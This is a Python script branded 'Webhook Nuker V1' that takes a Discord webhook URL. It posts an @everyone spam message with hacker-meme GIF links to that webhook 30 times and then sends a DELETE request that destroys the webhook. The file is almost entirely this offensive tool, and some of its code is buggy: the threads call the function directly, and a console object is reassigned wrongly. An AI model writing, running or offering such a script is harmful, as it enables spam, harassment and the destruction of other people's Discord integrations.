import time

import requests
import json
import threading
import os
import colorama
from colorama import *
from threading import *
import pystyle
from pystyle import *
import rich
from rich import *
while True:


    banner = """
    
 __        __     _      _                    _      _   _         _               
 \ \      / /___ | |__  | |__    ___    ___  | | __ | \ | | _   _ | | __ ___  _ __ 
  \ \ /\ / // _ \| '_ \ | '_ \  / _ \  / _ \ | |/ / |  \| || | | || |/ // _ \| '__|
   \ V  V /|  __/| |_) || | | || (_) || (_) ||   <  | |\  || |_| ||   <|  __/| |   
    \_/\_/  \___||_.__/ |_| |_| \___/  \___/ |_|\_\ |_| \_| \__,_| |_|\_\\___||_|   V1
                                                                                   

>>> created by BKS#1958
    
    
    """
    console = get_console()
    print(Fore.BLUE + banner)
    def nuker():
        os.system(f'Title - webhook Nuker - hit: {hit}')
        res = requests.post(webhooks1,  json={'username': 'Web Nuker', 'content': '@everyone https://tenor.com/view/hacker-pc-meme-matrix-codes-gif-16730883 https://tenor.com/view/hack-pc-guy-fawkes-hacker-gif-17047231 https://tenor.com/view/hacker-typing-hacking-computer-codes-gif-17417874'})
        console.print("{[blue]![/blue]} Message sent to the webhook")
    threads = []
    webhooks1 = console.input("{[blue]?[/blue]} enter the webhook to nuke : ")
    print()
    print()
    hit = 0
    for i in range(30):
        hit = hit + 1
        t = threading.Thread(target=nuker())
        threads.append(t)
        t.start()


    r = requests.delete(webhooks1)
    hit = 0

    print()
    print()
    console = console()
    console.print("{[red]![/red]} Webhook nuke")
    console.input("{[red]![/red]} Press enter to continue ")
    os.system('CLS || clear')
